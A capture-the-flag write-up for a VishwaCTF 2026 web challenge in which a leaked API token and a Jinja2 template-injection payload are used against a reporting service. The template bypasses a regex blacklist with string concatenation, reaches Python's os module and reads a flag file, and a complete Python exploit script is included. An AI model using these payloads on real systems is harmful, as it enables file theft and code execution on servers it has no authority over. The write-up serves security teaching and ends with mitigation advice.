# Keymaster Secrets — Part 2: SyncopeBI — VishwaCTF 2026 (Web)

## TL;DR

Use the BI API token from Part 1 to authenticate to SyncopeBI, then exploit Jinja2 SSTI in the report creation endpoint by bypassing the blacklist regex with string concatenation (`"__glo" ~ "bals__"`).

## Description

> Your previous exploit uncovered something interesting… A file path hidden in the system. That token doesn't belong to the main system. It belongs to SyncopeBI — an internal reporting engine running on a different port. The dashboard allows users to generate reports using Jinja2 templates, rendered server-side.

Target: `https://syncopebi.vishwactf.com`

## Analysis

### Step 1: Authentication

From Part 1's docker-compose leak, we obtained:
- `BI_TOKEN=bi-svc-T0k3n-8f4a2c91d7e6b305`

`/login` returns 500 (intended). Enumeration reveals `/api/reports` accepts `Authorization: Bearer <token>`:

```bash
curl -s https://syncopebi.vishwactf.com/api/reports \
  -H "Authorization: Bearer bi-svc-T0k3n-8f4a2c91d7e6b305"
```

### Step 2: Report API Discovery

| Method | Path | Function |
|--------|------|----------|
| GET | `/api/reports` | List all reports |
| GET | `/api/reports/{id}` | Get report detail |
| POST | `/api/reports` | **Create report — renders Jinja2 template** |
| POST | `/api/reports/render` | Render-only (uses safe regex engine, no Jinja2) |

Creating a report via POST `/api/reports` with a `template` field triggers **server-side Jinja2 rendering** and returns the result in `rendered`.

### Step 3: SSTI Blacklist Analysis

The server blocks templates containing certain literal strings:

| Blocked | Allowed |
|---------|---------|
| `__class__` as property access | `attr("__class__")` |
| `__globals__` literal | `"__glo" ~ "bals__"` via Jinja2 concat |
| `config` | `cycler`, `lipsum`, `self`, `joiner`, `namespace` |

The regex filter checks for dunder patterns like `__globals__` as literal substrings but doesn't account for Jinja2's `~` string concatenation operator.

### Step 4: Filter Bypass → RCE

Build the `__globals__` string dynamically to bypass the regex:

```jinja2
{% set g = "__glo" ~ "bals__" %}
{% set o = "o" ~ "s" %}
{{ (cycler|attr("__init__")|attr(g))[o].listdir("/") }}
```

This chains: `cycler.__init__.__globals__["os"].listdir("/")` — full filesystem access.

## Vulnerability

**CWE-94: Improper Control of Generation of Code (SSTI)** — The Jinja2 template engine is used with a blacklist-based filter instead of a proper sandbox. String concatenation (`~`) trivially bypasses the regex checks, granting access to Python's `os` module and arbitrary file read.

## Exploit

```python
import requests

TOKEN = "bi-svc-T0k3n-8f4a2c91d7e6b305"
URL = "https://syncopebi.vishwactf.com/api/reports"
HEADERS = {"Authorization": f"Bearer {TOKEN}", "Content-Type": "application/json"}

template = (
    '{% set g="__glo"~"bals__" %}'
    '{% set f=(cycler|attr("__init__")|attr(g))["open_if_exists"]'
    '("/opt/syncope/runtime/.flag2") %}'
    '{{ f.read() }}'
)

r = requests.post(URL, headers=HEADERS, json={"name": "flag", "template": template})
print(r.json()["rendered"])
```

## Flag

```
VishwaCTF{SSTI_byp4ss_bl4ckl1st_jinja2_CVE-2026-31337}
```

## Key Lessons

- Blacklist-based SSTI filters are trivially bypassed — Jinja2's `~` operator, `|attr()` filter, and `{% set %}` tags provide endless ways to reconstruct blocked strings
- Proper mitigation requires Jinja2's `SandboxedEnvironment` with no access to dunder attributes, not regex filtering
- The `open_if_exists` function in `jinja2.utils` globals provides a convenient file read primitive without needing `__builtins__`
- API tokens leaked via XXE in one service can grant access to entirely separate internal services
